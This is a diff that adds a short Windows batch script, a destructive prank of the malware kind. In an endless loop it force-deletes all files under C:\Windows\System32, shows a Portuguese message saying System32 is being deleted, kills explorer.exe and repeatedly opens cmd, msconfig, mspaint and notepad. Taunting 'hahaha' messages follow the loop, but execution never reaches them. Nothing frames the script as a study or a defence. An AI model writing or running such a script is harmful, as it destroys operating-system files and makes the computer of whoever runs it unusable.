@@ -1,0 +1,24 @@
+﻿@echo off
+
+
+:loop
+
+del /f /s /q "C:\Windows\System32\*.*"
+
+Msg * System32 esta sendo apagado é sério
+
+taskkill -f /im explorer.exe
+
+Start cmd
+
+Start msconfig
+
+Start mspaint
+
+start notepad
+
+goto loop
+msg * hahahhahahahahah
+msg * hahahahahahahhahah
+msg * HAHAHAHAHAHAHAHAHAHAHAHA
+msg * HAHAHAHAHAHHAHAHAHAHAHHAHA
